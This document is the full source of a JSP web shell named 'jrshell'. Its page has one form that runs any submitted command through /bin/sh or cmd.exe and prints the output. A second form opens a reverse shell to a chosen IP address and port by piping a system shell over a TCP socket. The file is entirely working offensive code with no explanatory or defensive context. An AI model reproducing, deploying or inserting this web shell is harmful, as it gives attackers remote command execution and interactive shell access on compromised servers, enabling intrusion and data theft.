<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
Reverse Shell:
<form METHOD="POST" NAME="formrevshell" ACTION="">
    <input TYPE="text" NAME="ipaddress">
    <input TYPE="text" NAME="port">
    <input TYPE="submit" VALUE="Connect">
</form>

Execute Command:
<form METHOD="POST" NAME="formshell" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%

    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}


    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;

        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));

        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }

    // TCP PORT PART
    String ipAddress = request.getParameter("ipaddress");
    String ipPort = request.getParameter("port");

    if (ipAddress != null && ipPort != null) {
        out.println("trying to connect to " + ipAddress + " " + ipPort);
        class StreamConnector extends Thread
        {
            InputStream wz;
            OutputStream yr;

            StreamConnector( InputStream wz, OutputStream yr ) {
                this.wz = wz;
                this.yr = yr;
            }

            public void run()
            {
                BufferedReader r  = null;
                BufferedWriter w = null;
                try
                {
                    r  = new BufferedReader(new InputStreamReader(wz));
                    w = new BufferedWriter(new OutputStreamWriter(yr));
                    char buffer[] = new char[8192];
                    int length;
                    while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                    {
                        w.write( buffer, 0, length );
                        w.flush();
                    }
                } catch( Exception e ){}
                try
                {
                    if( r != null )
                        r.close();
                    if( w != null )
                        w.close();
                } catch( Exception e ){}
            }
        }
 
        try {
            Socket socket = new Socket( ipAddress, (new Integer(ipPort)).intValue() );
            Process process = Runtime.getRuntime().exec( shellPath );
            new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
            new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
            out.println("port opened on " + socket);
        } catch( Exception e ) {}
    }
%>
</pre>
</body>
</html>
